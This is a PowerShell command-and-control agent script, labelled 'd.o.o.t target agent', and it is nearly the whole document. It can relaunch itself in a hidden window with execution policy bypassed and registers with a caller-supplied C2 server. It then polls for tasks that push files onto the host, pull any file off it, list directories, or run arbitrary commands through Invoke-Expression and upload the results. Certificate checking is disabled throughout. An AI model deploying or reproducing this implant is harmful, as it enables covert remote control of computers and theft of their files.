param(
  [Parameter(Mandatory=$true)][string]$C2Url,
  [switch]$Detached
)

if ($Detached) {
  Write-Host "Launching d.o.o.t agent in detached mode..."
  Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`" -C2Url `"$C2Url`""
  exit
}

$C2Url = $C2Url.TrimEnd('/')
$HostId = "$env:COMPUTERNAME-$([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())"
$OsName = "windows"
$Channel = if ($C2Url.StartsWith("https://")) { "HTTPS_POLL" } else { "HTTP_POLL" }

function Get-Text($Url) {
  (Invoke-WebRequest -Uri $Url -UseBasicParsing -SkipCertificateCheck -Method GET -TimeoutSec 10).Content
}

function Download-File($Url, $Dst) {
  $dir = Split-Path -Parent $Dst
  if ($dir -and !(Test-Path $dir)) {
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
  }
  Invoke-WebRequest -Uri $Url -UseBasicParsing -SkipCertificateCheck -Method GET -OutFile $Dst -TimeoutSec 20 | Out-Null
}

function Upload-File($Url, $Src) {
  Invoke-WebRequest -Uri $Url -UseBasicParsing -SkipCertificateCheck -Method POST -InFile $Src -ContentType "application/octet-stream" -TimeoutSec 20 | Out-Null
}

try {
  Get-Text "$C2Url/api/ping" | Out-Null
} catch {
  Write-Host "Unable to reach $C2Url/api/ping"
  exit 1
}

Get-Text "$C2Url/api/register?id=$HostId&os=$OsName&channel=$Channel" | Out-Null
Write-Host "d.o.o.t target agent online: id=$HostId channel=$Channel"

while ($true) {
  try {
    $task = Get-Text "$C2Url/api/task/$HostId"
  } catch {
    $task = "IDLE"
  }

  if ($task.StartsWith("IDLE")) {
    Start-Sleep -Seconds $SleepSeconds
    continue
  }

  $parts = $task.Split(' ', 3)
  if ($parts.Count -lt 3) {
    Start-Sleep -Seconds $SleepSeconds
    continue
  }

  $action = $parts[0]
  $token = $parts[1]
  $remotePath = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($parts[2].Replace('-', '+').Replace('_', '/')))

  if ($action -eq "PUSH") {
    try {
      Download-File "$C2Url/api/download/$HostId/$token" $remotePath
      Write-Host "received $remotePath"
    } catch {
      Write-Host "PUSH failed $remotePath"
    }
  } elseif ($action -eq "PULL") {
    if (Test-Path $remotePath) {
      try {
        Upload-File "$C2Url/api/upload/$HostId/$token" $remotePath
        Write-Host "sent $remotePath"
      } catch {
        Write-Host "PULL upload failed $remotePath"
      }
    } else {
      Write-Host "missing file: $remotePath"
    }
  } elseif ($action -eq "LS") {
    $tmpLs = "$env:TEMP\doot_ls_$token.txt"
    try {
      Get-ChildItem -Force -Path $remotePath *> $tmpLs
    } catch {
      $_.Exception.Message | Out-File $tmpLs
    }
    try { Upload-File "$C2Url/api/upload/$HostId/$token" $tmpLs; Write-Host "sent LS output" } catch { Write-Host "LS failed" }
    if (Test-Path $tmpLs) { Remove-Item $tmpLs -Force }
  } elseif ($action -eq "CMD") {
    $tmpCmd = "$env:TEMP\doot_cmd_$token.txt"
    try {
      Invoke-Expression $remotePath *> $tmpCmd
    } catch {
      $_.Exception.Message | Out-File $tmpCmd -Append
    }
    if (!(Test-Path $tmpCmd) -or (Get-Item $tmpCmd).Length -eq 0) {
      Set-Content -Path $tmpCmd -Value "Command executed, no output received"
    }
    try { Upload-File "$C2Url/api/upload/$HostId/$token" $tmpCmd; Write-Host "sent CMD output" } catch { Write-Host "CMD failed" }
    if (Test-Path $tmpCmd) { Remove-Item $tmpCmd -Force }
  }

  $sleepSecs = Get-Random -Minimum 1 -Maximum 11
  Start-Sleep -Seconds $sleepSecs
}
